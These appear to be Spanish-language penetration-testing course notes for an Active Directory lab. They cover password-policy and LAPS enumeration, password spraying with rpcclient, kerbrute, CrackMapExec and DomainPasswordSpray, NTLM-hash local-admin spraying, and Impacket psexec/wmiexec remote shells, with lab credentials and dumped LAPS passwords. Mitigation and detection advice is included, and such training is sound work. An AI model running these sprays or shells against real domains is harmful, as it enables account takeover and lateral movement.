SystemAccess   : @{MinimumPasswordAge=1; MaximumPasswordAge=-1; MinimumPasswordLength=8; PasswordComplexity=1;
                 PasswordHistorySize=24; LockoutBadCount=5; ResetLockoutCount=30; LockoutDuration=30;
                 RequireLogonToChangePassword=0; ForceLogoffWhenHourExpire=0; ClearTextPassword=0;
                 LSAAnonymousNameLookup=0}
KerberosPolicy : @{MaxTicketAge=10; MaxRenewAge=7; MaxServiceAge=600; MaxClockSkew=5; TicketValidateClient=1}
Version        : @{signature="$CHICAGO$"; Revision=1}
RegistryValues : @{MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=System.Object[]}
Path           : \\INLANEFREIGHT.LOCAL\sysvol\INLANEFREIGHT.LOCAL\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHI
                 NE\Microsoft\Windows NT\SecEdit\GptTmpl.inf
GPOName        : {31B2F340-016D-11D2-945F-00C04FB984F9}
GPODisplayName : Default Domain Policy
```

PowerView nos mostró la misma información que el comando `net accounts`, aunque en otro formato, y además reveló que la **complejidad de contraseñas está activada** (`PasswordComplexity=1`).

Al igual que en Linux, en Windows disponemos de múltiples herramientas para consultar la política de contraseñas, ya sea desde nuestro sistema de ataque o desde una máquina proporcionada por el cliente. Herramientas como **PowerView/SharpView**, **CrackMapExec**, **SharpMapExec**, entre otras, son buenas opciones.

La elección de una u otra dependerá del objetivo de la auditoría, si hay que mantener un perfil bajo, si hay **antivirus o EDRs activos**, o si existen otras restricciones en la máquina objetivo. En los siguientes apartados se verán algunos ejemplos.

##### Análisis de la política de contraseñas en el dominio `INLANEFREIGHT.LOCAL`:

- **Longitud mínima de contraseña: 8 caracteres**  
    → Es habitual, aunque hoy en día muchas organizaciones suben el mínimo a 10-14 para dificultar ataques de diccionario. Aun así, no elimina del todo el vector de password spraying.    
- **Umbral de bloqueo: 5 intentos fallidos**  
    → No es raro ver 3 o incluso sin límite. Un umbral de 5 sigue siendo aprovechable si se espacian los intentos.    
- **Duración del bloqueo: 30 minutos**  
    → Pasado ese tiempo, las cuentas se desbloquean automáticamente. Es preferible no llegar a bloquear ninguna durante un spraying.    
- **Desbloqueo automático activado**  
    → En otras organizaciones puede ser necesario que un administrador desbloquee manualmente las cuentas. En ese caso, provocar bloqueos masivos puede ser crítico.    
- **Complejidad de contraseña activada**  
    → Requiere 3 de 4 elementos: mayúscula, minúscula, número, carácter especial. Ej.: `Password1`, `Welcome1` cumplen con esto pero siguen siendo débiles.    

---

##### Política por defecto al crear un dominio en Windows:

|Política|Valor por defecto|
|---|---|
|Historial de contraseñas aplicado|24|
|Edad máxima de la contraseña|42 días|
|Edad mínima de la contraseña|1 día|
|Longitud mínima|7 caracteres|
|Complejidad requerida|Activada|
|Contraseñas almacenadas reversiblemente|Desactivado|
|Duración del bloqueo por intentos fallidos|No configurado|
|Umbral de bloqueo|0|
|Ventana de reinicio del contador de bloqueos|No configurado|

Esto deja claro que muchas organizaciones no modifican la política por defecto, manteniendo valores fácilmente explotables si no se implementan medidas adicionales.

---

##### Windows Defender

Podemos usar el cmdlet de PowerShell [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=win10-ps) para comprobar el estado actual de Defender. Aquí, en concreto, podemos comprobar que `RealTimeProtectionEnabled` se encuentra como `true`, lo que significa que Defender está habilitado en el sistema.

```powershell-session
PS C:\htb> Get-MpComputerStatus
```

---

### AppLocker

Una lista blanca de aplicaciones es un control que define qué programas pueden instalarse y ejecutarse en un sistema, evitando malware y software no autorizado. En Windows, AppLocker permite gestionar de forma granular permisos sobre ejecutables, scripts, instaladores, DLLs y apps empaquetadas. Aunque muchas organizaciones bloquean cmd.exe o PowerShell.exe, suelen pasar por alto rutas alternativas como SysWOW64 o PowerShell_ISE.exe, lo que permite ejecutar PowerShell desde ubicaciones no contempladas en la regla. En entornos con políticas AppLocker más estrictas harán falta técnicas avanzadas para eludirlas.

##### Usando Get-AppLockerPolicy

```powershell-session
PS C:\htb> Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PathConditions      : {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 3d57af4a-6cf8-4e5b-acfc-c2c2956061fa
Name                : Block PowerShell
Description         : Blocks Domain Users from using PowerShell on workstations
UserOrGroupSid      : S-1-5-21-2974783224-3764228556-2640795941-513
Action              : Deny

```

---
### PowerShell Constrained Language

PowerShell Constrained Language Mode restringe muchas de las funcionalidades necesarias para usar PowerShell con eficacia, como el bloqueo de objetos COM, permitir únicamente tipos .NET aprobados, flujos de trabajo basados en XAML, clases de PowerShell y más. Podemos comprobar rápidamente si estamos en Full Language Mode o en Constrained Language Mode.

```powershell-session
PS C:\htb> $ExecutionContext.SessionState.LanguageMode

ConstrainedLanguage
```

---
### LAPS

La Microsoft Local Administrator Password Solution (LAPS) se utiliza para aleatorizar y rotar las contraseñas de administrador local en hosts Windows y prevenir el movimiento lateral. Podemos enumerar qué usuarios de dominio pueden leer la contraseña LAPS configurada en los equipos con LAPS instalado y qué equipos no lo tienen. El LAPSToolkit lo facilita enormemente con varias funciones. Una de ellas analiza los ExtendedRights de todos los equipos con LAPS habilitado. Esto mostrará los grupos específicamente delegados para leer las contraseñas LAPS, que suelen ser usuarios de grupos protegidos. Una cuenta que ha unido un equipo al dominio recibe todos los Extended Rights sobre ese host, y este derecho le permite leer las contraseñas. La enumeración puede revelar una cuenta de usuario capaz de leer la contraseña LAPS en un equipo, lo que nos ayuda a enfocar ataques en usuarios de AD específicos que pueden acceder a esas contraseñas.

##### Usando Find-LAPSDelegatedGroups

```powershell-session
PS C:\htb> Find-LAPSDelegatedGroups
```

El cmdlet `Find-AdmPwdExtendedRights` comprueba los permisos en cada equipo con LAPS habilitado para detectar grupos con acceso de lectura y usuarios con “All Extended Rights”. Los usuarios con “All Extended Rights” pueden leer las contraseñas LAPS y, a menudo, están menos protegidos que los usuarios en grupos delegados, por lo que merece la pena comprobarlo.

```powershell-session
PS C:\htb> Find-AdmPwdExtendedRights

ComputerName                Identity                    Reason
------------                --------                    ------
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\Domain Admins Delegated
EXCHG01.INLANEFREIGHT.LOCAL INLANEFREIGHT\LAPS Admins   Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\Domain Admins Delegated
SQL01.INLANEFREIGHT.LOCAL   INLANEFREIGHT\LAPS Admins   Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\Domain Admins Delegated
WS01.INLANEFREIGHT.LOCAL    INLANEFREIGHT\LAPS Admins   Delegated
```

Podemos usar la función **Get-LAPSComputers** para buscar los equipos que tienen LAPS habilitado cuando expiran las contraseñas e incluso obtener las contraseñas aleatorias en texto claro si nuestro usuario tiene acceso.

##### Usando Get-LAPSComputers

```powershell-session
PS C:\htb> Get-LAPSComputers

ComputerName                Password       Expiration
------------                --------       ----------
DC01.INLANEFREIGHT.LOCAL    6DZ[+A/[]19d$F 08/26/2020 23:29:45
EXCHG01.INLANEFREIGHT.LOCAL oj+2A+[hHMMtj, 09/26/2020 00:51:30
SQL01.INLANEFREIGHT.LOCAL   9G#f;p41dcAe,s 09/26/2020 00:30:09
WS01.INLANEFREIGHT.LOCAL    TCaG-F)3No;l8C 09/26/2020 00:46:04
```

# Password Spraying interno

### Desde Linux

Una vez que hemos generado una lista de contraseñas con alguno de los métodos mostrados en la sección anterior, llega el momento de lanzar el ataque. **`rpcclient`** es una opción muy útil para realizarlo desde un sistema Linux.

Un punto importante a tener en cuenta es que **`rpcclient` no muestra de forma explícita si el inicio de sesión ha sido exitoso**. Sin embargo, si la respuesta contiene `"Authority Name"`, significa que las credenciales han sido válidas.

Por ello, podemos **filtrar los intentos fallidos** buscando únicamente las respuestas que incluyan `"Authority"`. Para ello, se puede utilizar un **one-liner en Bash** que automatiza el ataque e identifica intentos exitosos mediante ese patrón.

##### Usando un one-liner para el ataque

```shell-session
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done

Account Name: tjohnson, Authority Name: INLANEFREIGHT
Account Name: sgage, Authority Name: INLANEFREIGHT
```

##### Usando Kerbrute

También podemos usar `kerbrute` para realizar el mismo ataque:

```shell-session
amr251@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
 
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:57:12 >  Using KDC(s):
2022/02/17 22:57:12 >  	172.16.5.5:88

2022/02/17 22:57:12 >  [+] VALID LOGIN:	 sgage@inlanefreight.local:Welcome1
2022/02/17 22:57:12 >  Done! Tested 57 logins (1 successes) in 0.172 seconds
```

Existen varios métodos para realizar ataques de password spraying desde Linux, y otra excelente opción es utilizar **CrackMapExec**. Esta herramienta versátil permite usar un archivo de texto con múltiples nombres de usuario y probarlos todos contra una única contraseña, característica clave para un ataque de spraying.

En este contexto, se puede utilizar `grep` para filtrar las respuestas que contienen el símbolo `+`, que indica inicios de sesión exitosos. Esto ayuda a centrarse únicamente en los intentos válidos, evitando que se pierda información útil entre las muchas líneas de salida que genera el comando.

##### Usando CrackMapExec y filtrando errores de login

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123 
```

Una vez que obtenemos uno o más accesos exitosos mediante un ataque de password spraying, podemos usar **CrackMapExec** para validar rápidamente las credenciales contra un **Controlador de Dominio**. Esto permite confirmar que el nombre de usuario y la contraseña funcionan correctamente y, además, verificar el nivel de acceso que tienen dentro del dominio.

##### Validando las credenciales con CrackMapExec

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\avazquez:Password123
```

##### Reutilización de la contraseña del administrador local

El password spraying interno no se limita a cuentas de dominio. Si se obtiene acceso administrativo y el hash NTLM o la contraseña en claro de una cuenta local con privilegios (como _Administrator_), se puede intentar autenticar contra múltiples equipos de la red. Esto es común debido al uso de imágenes base (gold images) donde la contraseña local se reutiliza.

**CrackMapExec** es ideal para este tipo de ataques. Es especialmente útil apuntar a máquinas críticas como servidores SQL o Exchange, ya que es más probable que allí haya credenciales privilegiadas en memoria.

Es buena práctica probar variaciones de contraseñas si encontramos un patrón (por ejemplo, `$desktop%@admin123` → `$server%@admin123`). También conviene probar si un usuario reutiliza la misma contraseña en su cuenta administrativa (ej. `ajones` y `ajones_adm`), o incluso entre dominios si hay relaciones de confianza.

Si solo tenemos el hash NTLM, podemos hacer un spray contra todo un rango (por ejemplo, una /23) usando la opción `--local-auth` en CrackMapExec. Esta bandera fuerza la autenticación local y evita bloqueos accidentales en el dominio. Sin ella, el intento sería contra el dominio y podría bloquear cuentas.

##### Local Admin Spraying con CrackMapExec

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +

SMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
SMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

Este método nos muestra que las credenciales son válidas como administrador local en tres sistemas dentro del rango 172.16.5.0/23. A partir de aquí, podríamos enumerar esos sistemas en busca de información útil para escalar privilegios o moverse lateralmente.

Sin embargo, esta técnica es bastante ruidosa y no es adecuada para escenarios donde se requiere sigilo. Aun así, merece la pena comprobar si existe este problema en las auditorías, ya que es una debilidad común que debe comunicarse al cliente.

Una forma de mitigarlo es implementar **Microsoft LAPS (Local Administrator Password Solution)**, que permite a Active Directory gestionar contraseñas únicas y rotatorias para las cuentas de administrador local en cada máquina.
### Desde Windows

Desde un punto de apoyo en un equipo Windows unido al dominio, la herramienta [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) resulta muy efectiva. Si ya estamos autenticados en el dominio, la herramienta generará automáticamente una lista de usuarios desde Active Directory, consultará la política de contraseñas del dominio y excluirá las cuentas de usuario que estén a un intento de bloqueo. Al igual que ejecutamos el ataque de “spray” desde nuestro equipo Linux, también podemos proporcionar manualmente una lista de usuarios a la herramienta si estamos en un equipo Windows pero **no** autenticados en el dominio.

DomainPasswordSpray en un Windows unido al dominio genera sola la lista de usuarios de AD, aplica la política de contraseñas y evita bloquear cuentas cercanas al límite; solo hay que pasarle una contraseña con `-Password` y guardar los resultados con `-OutFile`.

##### Usando DomainPasswordSpray.ps1

```powershell-session
PS C:\htb> Import-Module .\DomainPasswordSpray.ps1
PS C:\htb> Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

También podríamos utilizar `kerbrute` para acontecer la misma enumeración de usuarios y pasos de spraying mostrados en la sección anterior. 

##### Mitigaciones

Se pueden aplicar varias medidas para mitigar el riesgo de ataques de password spraying. Aunque ninguna solución por sí sola lo evita por completo, un enfoque de defensa en profundidad hará que estos ataques sean extremadamente difíciles.

| Técnica                         | Descripción                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              |
|---------------------------------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| Autenticación multifactor       | La autenticación multifactor reduce drásticamente el riesgo de password spraying. Hay varios tipos: notificaciones push a un dispositivo móvil, contraseñas de un solo uso (OTP) rotativas como Google Authenticator, clave RSA o confirmaciones por SMS. Aunque esto impida al atacante acceder, algunas implementaciones aún revelan si la combinación usuario/contraseña es válida, posibilitando reutilizarla en otros servicios. Es crucial aplicarlo en todos los portales externos. |
| Restricción de acceso           | A menudo cualquier cuenta de dominio puede iniciar sesión en aplicaciones, incluso si no la necesita para su rol. Siguiendo el principio de privilegio mínimo, el acceso debe limitarse solo a quienes realmente lo requieran.                                                                                                                                                                                                                                                                               |
| Reducción del impacto           | Un atajo eficaz es que los usuarios privilegiados usen una cuenta separada para actividades administrativas. También conviene implementar niveles de permiso específicos por aplicación. La segmentación de red es recomendable, pues aislar al atacante en una subred comprometida puede ralentizar o detener el movimiento lateral y nuevas intrusiones.                                                                                                      |
| Higiene de contraseñas          | Formar a los usuarios para elegir contraseñas difíciles de adivinar, como frases de paso, disminuye la eficacia del password spraying. Además, usar filtros que bloqueen palabras comunes, meses, estaciones o variaciones del nombre de la empresa complica al atacante elegir contraseñas válidas para sus intentos.                                                                                                                                                |

Es vital garantizar que la política de bloqueo de contraseñas del dominio no incremente el riesgo de ataques de denegación de servicio. Si resulta demasiado restrictiva y exige intervención administrativa para desbloquear cuentas manualmente, un password spray descuidado podría bloquear numerosas cuentas en poco tiempo.

##### Detección

Los signos más claros de un ataque de password spraying externo son un aumento repentino de bloqueos de cuentas y un volumen elevado de intentos de inicio de sesión en poco tiempo, ya sea contra usuarios válidos o inexistentes. En los controladores de dominio, múltiples eventos 4625 (fallo de inicio de sesión) en cortos intervalos deberían generar alertas; un atacante sofisticado puede evitar SMB y atacar LDAP, lo que se refleja en eventos 4771 (fallo de preautenticación Kerberos) si se habilita el registro Kerberos. Configurar reglas que correlacionen esos fallos y mantener un registro exhaustivo permite detectar y frenar tanto ataques externos como internos de password spraying.

##### Password Spraying externo

Aunque está fuera del alcance de este módulo, el password spraying también es una técnica habitual que los atacantes emplean para intentar obtener un punto de apoyo en Internet. Hemos tenido mucho éxito con este método durante pruebas de penetración para acceder a datos sensibles a través de buzones de correo o aplicaciones web como intranets accesibles externamente. Algunos objetivos comunes incluyen:

- Microsoft 0365    
- Outlook Web Exchange    
- Exchange Web Access    
- Skype for Business    
- Lync Server    
- Portales de Microsoft Remote Desktop Services (RDS)    
- Portales Citrix que usan autenticación de AD    
- Implementaciones VDI con autenticación de AD, como VMware Horizon    
- Portales VPN (Citrix, SonicWall, OpenVPN, Fortinet, etc. que usan autenticación de AD)    
- Aplicaciones web personalizadas que usan autenticación de AD

# Enumeración con credenciales - Linux

### CrackMapExec

CME ofrece un menú de ayuda para cada protocolo (por ejemplo, `crackmapexec winrm -h`). Asegúrate de revisar todo el menú de ayuda y todas las opciones posibles. Por ahora, las opciones que nos interesan son:

- `-u Username`  El usuario cuyas credenciales utilizaremos para autenticarnos.    
- `-p Password`  La contraseña del usuario.
- `Target` (IP o FQDN)  El host objetivo a enumerar (en nuestro caso, el Controlador de Dominio).
- `--users`  Especifica que se deben enumerar los usuarios del dominio.
- `--groups`  Especifica que se deben enumerar los grupos del dominio.
- `--loggedon-users`  Intenta enumerar los usuarios que están conectados en el objetivo, si los hay.

Comenzaremos usando el protocolo SMB para enumerar usuarios y grupos. Apuntaremos al Controlador de Dominio (cuya dirección descubrimos antes) porque contiene todos los datos de la base de datos del dominio que nos interesan. Recuerda anteponer `sudo` a todos los comandos.

##### CME - Enumeración de Usuario de Dominio

Empezamos apuntando CME al Controlador de Dominio y usando las credenciales del usuario **forend** para obtener la lista de todos los usuarios del dominio. Fíjate en que, al mostrarnos la información de cada usuario, incluye atributos como **badPwdCount**. Esto es útil para ataques de password spraying dirigidos: podríamos filtrar la lista de usuarios objetivo excluyendo aquellos cuyo **badPwdCount** sea mayor que 0, para evitar bloquear cuentas por error.

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

También podemos obtener una lista completa de grupos de dominio. Deberíamos guardar todo el output en archivos fácilmente accesibles para consultarlos en caso de reportar la información encontrada o usarla con otras herramientas.

##### CME - Enumeración de grupo de dominio

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain group(s)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Administrators                           membercount: 3
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Users                                    membercount: 4
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Guests                                   membercount: 2
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Print Operators                          membercount: 0
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Backup Operators                         membercount: 1
SMB         172.16.5.5      445    ACADEMY-EA-DC01  Replicator                               membercount: 0

<SNIP>
```

El fragmento anterior lista los grupos dentro del dominio y el número de usuarios en cada uno. La salida también muestra los grupos integrados en el Controlador de Dominio, como **Backup Operators**. Podemos empezar a apuntar los grupos de interés. Fíjate en grupos clave como **Administrators**, **Domain Admins**, **Executives** y cualquier otro que pueda contener administradores de TI con privilegios; esos usuarios elevados serán los objetivos más valiosos durante nuestra evaluación.

##### CME - Usuarios logueados

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01

<SNIP>
```

En este servidor vemos múltiples usuarios conectados; destaca que **forend** es administrador local (lo indica “Pwn3d!”) y que **svc_qualys**, un Domain Admin, también tiene sesión activa. Esto sugiere que puede usarse como jump host y que robar o suplantar las credenciales de **svc_qualys** en memoria sería un objetivo sencillo. Herramientas como CME permiten esta enumeración enfocada, mientras que BloodHound (o PowerView) facilita la detección gráfica y rápida de sesiones de usuario en el dominio.

##### CME - Búsqueda de shares/recursos

Podemos usar el flag `--shares` para enumerar recursos disponibles en el host remoto y el nivel de acceso que nuestra cuenta tiene en cada share:

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```

Existe un módulo llamado `spider_plus` que excavará a través de cada recurso con permisos de lectura y listará todos los archivos leíbles.

```shell-session
amr251@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

...SNIP...
SPIDER_P... 172.16.5.5      445    ACADEMY-EA-DC01  [*]     OUTPUT: /tmp/cme_spider_plus
```

En el comando anterior ejecutamos el spider contra las Department Shares. Al finalizar, CME guarda los resultados en un fichero JSON en `/tmp/cme_spider_plus/<IP_del_host>`. A continuación vemos un fragmento de esa salida JSON.

Podríamos explorar para encontrar archivos interesantes, como `web.config` o scripts que contengan contraseñas. Si quisiéramos profundizar, podríamos descargar esos ficheros y revisar su contenido en busca de credenciales embebidas u otra información sensible.

### SMBMap

SMBMap te permite, desde un host Linux, enumerar recursos SMB remotos usando credenciales de dominio: muestra qué comparticiones existen, sus permisos y su contenido, y facilita descargar/subir ficheros o ejecutar comandos. Además de listar shares, ofrece opciones como listado recursivo de directorios o búsqueda de contenido en archivos, lo que resulta muy útil para extraer información valiosa de los recursos compartidos.

##### Comprobar acceso

```shell-session
amr251@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
    Disk                                                Permissions	Comment
	----                                                -----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	Department Shares                                 	READ ONLY	
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	User Shares                                       	READ ONLY	
	ZZZ_archive                                       	READ ONLY
```

La salida anterior nos muestra a qué recursos puede acceder nuestro usuario y con qué permisos. Al igual que con CME, vemos que **forend** no tiene acceso a ADMIN$ ni a C$ del DC (lo esperable para una cuenta estándar), pero sí permiso de lectura en IPC$, NETLOGON y SYSVOL, que es lo predeterminado en cualquier dominio. Los recursos no estándar, como **Department Shares** y los shares de usuario o de archivo, son los más interesantes. Hagamos un listado recursivo de directorios en **Department Shares**: como cabe esperar, aparecerán subdirectorios para cada departamento de la empresa.

##### Lista recursiva de todos los directorios

```shell-session
amr251@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

[+] IP: 172.16.5.5:445	Name: inlanefreight.local                               
    Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Department Shares                                   	READ ONLY	
	.\Department Shares\*
```

Al profundizar el listado recursivo, se mostrará la salida de todos los subdirectorios dentro de los directorios de nivel superior. El uso de `--dir-only` ofrece únicamente la lista de directorios y no incluye los archivos. Pruébalo contra otros recursos compartidos en el Controlador de Dominio y comprueba qué puedes encontrar.

### RPCClient

Debido a las sesiones NULL de SMB (tratadas en profundidad en la sección de password spraying) en algunos de nuestros hosts, podemos realizar enumeración autenticada o no autenticada usando `rpcclient` en el dominio INLANEFREIGHT.LOCAL. Un ejemplo de uso de `rpcclient` desde un punto de vista no autenticado (si esta configuración existe en el dominio objetivo) sería:

```bash
rpcclient -U "" -N 172.16.5.5
```

Al ver usuarios en **rpcclient**, aparece junto a cada uno un campo **rid**, que es el identificador relativo (en hexadecimal) que Windows añade al **SID** del dominio para crear el SID completo de un objeto. Por ejemplo, el dominio **INLANEFREIGHT.LOCAL** tiene SID base `S-1-5-21-3842939050-3880317879-2865463114`; al sumar el RID hexadecimal `0x457` (decimal 1111) de **htb-student**, obtenemos su SID completo `S-1-5-21-3842939050-3880317879-2865463114-1111`. Ese valor es único en el dominio. En cambio, cuentas integradas como **Administrator** siempre usan el mismo RID (`0x1f4` → 500), lo que facilita identificarlas y profundizar en su enumeración con herramientas como **rpcclient**.

##### Enumeración de usuarios con RPCClient por RID

```shell-session
rpcclient $> queryuser 0x457
```

Al consultar con `queryuser` el RID `0x457`, `rpcclient` nos devolvió la información de **htb-student**, tal como esperábamos. Para obtener los RID de todos los usuarios de forma masiva, bastaría con usar el comando `enumdomusers`.

### Impacket Toolkit

Impacket es un conjunto de herramientas en Python para interactuar y explotar protocolos Windows (entre ellas wmiexec.py y psexec.py). Tras capturar y crackear el hash de wley (obteniendo la contraseña transporter@4), utilizaremos esas credenciales—siendo administrador local en ACADEMY-EA-FILE—para las siguientes acciones.
##### Psexec.py

Una de las herramientas más útiles del conjunto Impacket es **psexec.py**. Psexec.py es una réplica del ejecutable psexec de Sysinternals, pero funciona de forma ligeramente distinta al original. La herramienta crea un servicio remoto subiendo un ejecutable con nombre aleatorio al recurso ADMIN$ del equipo objetivo. A continuación, registra el servicio mediante RPC y el Windows Service Control Manager. Una vez establecido, la comunicación se realiza a través de una tubería con nombre (named pipe), ofreciendo una shell remota interactiva con privilegios SYSTEM en el equipo víctima.

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```

##### Wmiexec.py

Wmiexec.py ofrece una shell seminteractiva usando WMI, sin dejar archivos en el equipo objetivo y generando menos registros. Se ejecuta con el usuario administrador local que especifiques (en lugar de SYSTEM), lo que lo hace más sigiloso; aunque sigue siendo detectable por AV/EDR modernos. Usaremos la misma cuenta que con psexec.py para acceder.

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

Este shell de WMI no es totalmente interactivo: cada comando lanza un nuevo `cmd.exe`, lo que genera un evento 4688 (“nuevo proceso creado”) en los registros y puede alertar a un defensor. Además, funciona bajo el contexto del usuario (por ejemplo, **wley**) y no como **SYSTEM**, lo que lo hace algo más discreto pero aún detectable. Aun así, Impacket es una herramienta esencial para pentesters en entornos Windows.

### Windapsearch

Windapsearch es un script en Python que, mediante consultas LDAP, permite enumerar usuarios, grupos y equipos de un dominio Windows. Tenemos varias opciones con Windapsearch para realizar una enumeración estándar (volcar usuarios, equipos y grupos) y una más detallada. La opción `--da` (enumerar los miembros del grupo de administradores de dominio) y la opción `-PU` (buscar usuarios privilegiados). La opción `-PU` es interesante porque realiza una búsqueda recursiva de usuarios con membresías de grupos anidados.

##### Windapsearch - Administradores de Dominio

```shell-session
amr251@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 u:INLANEFREIGHT\forend
[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

<SNIP>
```

Con `windapsearch -PU` puedes detectar usuarios con privilegios elevados derivados de membresías de grupos anidados, lo cual es muy útil para informar sobre permisos excesivos en tu reporte.

##### Windapsearch - usuarios privilegiados

```shell-session
amr251@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

Observarás que realizó variaciones sobre nombres comunes de grupos elevados en distintos idiomas. Esta salida ejemplifica el peligro de la membresía de grupos anidados, y resultará aún más evidente cuando usemos los gráficos de BloodHound para visualizarlo.

### BloodHound.py

Con credenciales de dominio, ejecutamos el ingestor BloodHound.py desde nuestro host Linux para recolectar datos de Active Directory (usuarios, grupos, equipos, miembros de grupos, GPO, ACL, sesiones, accesos RDP/WinRM, etc.) y generar “rutas de ataque” gráficas en la GUI de BloodHound. Gracias a su teoría de grafos y a queries predefinidas o personalizadas en Cypher, detecta relaciones y vulnerabilidades sutiles que pasarían desapercibidas con otras herramientas. Además de la versión C# (SharpHound) para Windows, existe este collector en Python (necesita Impacket, ldap3 y dnspython), ideal cuando no disponemos de un equipo Windows unido al dominio o para evitar levantar alertas en entornos muy protegidos.

